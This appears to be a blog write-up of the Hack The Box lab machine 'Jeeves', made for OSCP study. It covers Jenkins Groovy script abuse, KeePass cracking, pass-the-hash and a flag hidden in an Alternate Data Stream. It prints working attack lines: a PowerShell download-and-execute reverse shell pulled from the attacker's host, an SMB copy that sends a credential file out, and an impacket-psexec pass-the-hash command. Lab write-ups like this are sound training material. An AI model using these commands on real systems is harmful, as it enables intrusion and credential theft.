---
title: "Hack The Box - Jeeves"
date: 2020-02-06
tags: [oscp, htb, windows]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Jenkins Groovy script, KeePass DB cracking, and Alternate Data Streams"
picture: /assets/htb-jeeves/machine_info.png
author_profile: false
---

![](/assets/htb-jeeves/machine_info.png)

## Enumeration

Nmap scans show that ports 80, 135, 445, and 50000 are open. The HTTP server on port 80 shows as IIS 10.0, which means we're looking at either Windows 10, Server 2016, or Server 2019.

```
Nmap scan report for 10.10.10.63
Host is up, received user-set (0.049s latency).
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m46s, deviation: 0s, median: 5h00m46s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-02-06T00:15:50
|_  start_date: 2020-02-05T23:51:53

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 168.85 seconds
```

### Port 80

Navigating to the page on port 80 shows a search bar from Ask Jeeves.

![](/assets/htb-jeeves/port80_search.png)

However, when a search is run, we get the same error each time.

![](/assets/htb-jeeves/port80_error.png)

If we look at the source code for the error page, we can see that what we're seeing is just a static image, not a real error.

```html
<img src="jeeves.PNG" width="90%" height="100%">
```

Additional scans with `dirsearch` and `nikto` show no additional subdirectories, or interesting endpoints to check out.

### Port 50000

Running `dirsearch` on port 50000 shows a subdirectory for `/askjeeves`, which leads to a control panel for Jenkins.

![](/assets/htb-jeeves/ask_jeeves_home.png)

Digging into the Jenkins tools (*Manage Jenkins > About Jenkins*) allows us to see that we're looking at version 2.87 of the software. However, Exploit-DB doesn't show an exact match for this version.

---

## Initial Shell

### Groovy Script

In looking through the Jenkins tools available in the *Manage Jenkins* page, we can see the option for *Script Console*.

![](/assets/htb-jeeves/jenkins_script_console.png)

This page allows us to run a custom Groovy script on the server. We can exploit this to grab a good reverse shell. To do this, we'll need the [Nishang github repo](https://github.com/samratashok/nishang) copied locally, as we'll need to grab a file from it, and host it, so that our code can reach out for it via Powershell to run. My copy is cloned to `/opt/nishang`.

Copy the Nishang `Invoke-PowerShellTcp.ps1` script to your working directory with:

```bash
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1
```

We need to modify it, to set it up for auto-execution, instead of just loading modules to memory. Copy the below command into the last line of the script:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 7500
```

Now just setup a Python SimpleHTTPServer on port 80 with `python -m SimpleHTTPServer 80`

We can use the below code in the Groovy console to generate a reverse shell console when run.

```groovy
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/rev.ps1')" """
println cmd.execute().text
```

![](/assets/htb-jeeves/jenkins_script_groovy_run.png)

Make sure to start a listener with `nc -lvnp 7500` before pasting the script and running it.

![](/assets/htb-jeeves/initial_shell.png)

And just like that, we have our initial shell on the target.

---

## Privilege Escalation

### Cracking a KeePass Database

As we go enumerating, we can see in the `C:\Users\kohsuke]Documents\` directory, a file named `CEH.kdbx`, which is a KeePass credential file. We can copy this to our machine, and crack it locally.

To copy, we can setup a simple DMB Server on our machine with `impacket-smbserver kali .`, and copy the file to us with `copy CEH.kdbx \\10.10.14.15\kali\CEH.kdbx`.

<a href="/assets/htb-jeeves/impacket_copy_keepass.png"><img src="/assets/htb-jeeves/impacket_copy_keepass.png" width="95%"></a>

Now that the file is local, we can get a crackable hash from it with `keepass2john CEH.kdbx > CEH.hash`. This will output a hash that `hashcat` will recognize, and can work with to crack.

![](/assets/htb-jeeves/keepass2john.png)

> NOTE: For `hashcat` to properly read the hash, you'll have to edit the `CEH.hash` file, and remove the leading `CEH:` before the actual hash.

Now that we have the hash, we need to feed it to `hashcat` for cracking. We can use the command  `hashcat -m 13400 CEH.hash ~/wordlists/rockyou.txt --force` to crack it.

![](/assets/htb-jeeves/kp_cracked.png)

We have cracked the password for the KeePass database as `moonshine1`. We will need to install `keepass2` from the Kali repos in order to open it. Use `sudo apt install keepass2` to install, and just double-click on the KDBX file when done. Enter `moonshine1` as the master password, and the file will open up.

![](/assets/htb-jeeves/keepass2_open.png)

![](/assets/htb-jeeves/keepass2_list.png)

### Pass the Hash

In the list of credentials, we see some interesting possibilities for potential Admin passwords. We can try using these with `impacket-psexec Administrator@10.10.10.63`, and entering the password when prompted. As you can see, none of the passwords work.

![](/assets/htb-jeeves/psexec_fail.png)

If we look at the last entry in the list, it gives a simple ? as a username, and a long string as password. This is far too long to be a password. It actually looks like a NTLM hash. If this is the case, we might be able to use PSEXec via a Pass-the-hash attack, where we supply the hash instead of the password. We can test this with:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63
```

![](/assets/htb-jeeves/root_shell.png)

Sure enough, our PTH attack worked, and we got a shell as `SYSTEM`! All that's left is to grab the `root.txt` flag from `C:\Users\Administrator\Desktop\root.txt`. 

### But wait, there's more!

When we pull up the listing for the Administrators Desktop directory, we don't see `root.txt`, only `hm.txt`, which reads an output of `The flag is elsewhere.  Look deeper.`.

This seems like the flag is hidden within an Alternate Data Stream, within `hm.txt`. We can verify this with `dir /r`, which shows that in fact, `root.txt` is within `hm.txt` as an ADS.

![](/assets/htb-jeeves/root_ads.png)

Powershell has a built-in function to read ADS. We can use the command `powershell (Get-Content hm.txt -Stream root.txt)` to display the contents of the ADS.

![](/assets/htb-jeeves/root_proof.png)



